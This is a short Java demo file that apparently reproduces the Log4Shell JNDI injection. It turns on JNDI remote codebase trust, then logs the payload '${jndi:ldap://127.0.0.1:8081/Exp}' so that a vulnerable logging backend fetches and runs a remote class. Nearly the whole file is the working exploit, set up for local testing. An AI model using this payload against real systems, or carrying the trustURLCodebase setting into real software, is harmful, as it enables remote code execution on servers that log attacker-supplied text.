import org.apache.commons.logging.Log;
import org.apache.commons.logging.LogFactory;


public class Demo {
    static final Log log = LogFactory.getLog(Demo.class);

    public static void main(String[] args) {
        System.setProperty("com.sun.jndi.ldap.object.trustURLCodebase", "true");
        log.info("a");
        log.error("${jndi:ldap://127.0.0.1:8081/Exp}");

        a();
    }

    public static void a(){
        log.info("b");
    }
}
